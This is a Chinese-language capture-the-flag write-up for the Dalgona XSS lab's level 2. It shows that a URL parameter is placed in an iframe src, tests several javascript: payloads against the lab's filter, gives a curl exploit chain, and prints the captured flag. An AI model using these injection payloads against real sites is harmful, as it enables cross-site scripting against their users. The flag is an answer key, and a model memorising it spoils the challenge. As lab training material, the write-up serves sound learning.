## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 2 关
（样式表 `static/css/xss/xss2.css`，标题 `Dalgona - Circle`）。

与其它 Dalgona 关卡不同，这关的输入**不是**文本框回显，而是：

```html
<input type=text name=url placeholder="Enter the URL you want to visit...">
<iframe class="text-img" src=./static/img/head.png></iframe>
```

`url` 参数被填进 `<iframe src="…">`。

### 关键观察

**1. 输入被放进 iframe 的 `src` 属性。**

```bash
curl --get --data-urlencode 'url=http://example.com' http://$T/page
# <iframe src="http://example.com" …>
```

**2. 直接用 `javascript:` 就成立。**

| url | 结果 |
| --- | --- |
| `javascript:alert('XSS')` | **Congratulations** |
| ``javascript:alert(`XSS`)`` | **Congratulations** |
| `javascript:alert(1)` | 失败（参数不是 `XSS`） |
| `javascript:alert(/XSS/)` | 失败（正则不是字符串） |
| `javascript:alert(String.fromCharCode(88,83,83))` | 失败（src 被过滤成空） |

**3. 引号的选择很关键。**

`src="…"` 用双引号包裹，所以 payload 内部要用**单引号或反引号**；
`String.fromCharCode(...)` 里的 `(` `,` 组合会让过滤器把整个 `src` 清空
（属于关键字/形状匹配）。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode "url=javascript:alert('XSS')" \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

```text
flag{5ed799c5-ffee-4992-bc1f-3c6f777ea1e5}
```

成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **先看输入落在哪个上下文。** 前面几关是文本节点或属性值；这一关是
  `iframe src`。上下文决定了可选原语：`src` 里能放 `javascript:` 伪协议。
- **`src="…"` 是双引号，所以 payload 内层用单引号/反引号。** 写
  `alert("XSS")` 会把属性截断，反而失败。
- **评分只看 `alert` 的参数是不是字符串 `XSS`。**
  `alert(1)`、`alert(/XSS/)`（正则对象）都不算；`'XSS'`、`` `XSS` `` 都算。
- **`String.fromCharCode` 这种长表达式被过滤器拦空。** 说明除了引号限制，
  还有形状/关键字过滤；能用短 payload 就别用长的。
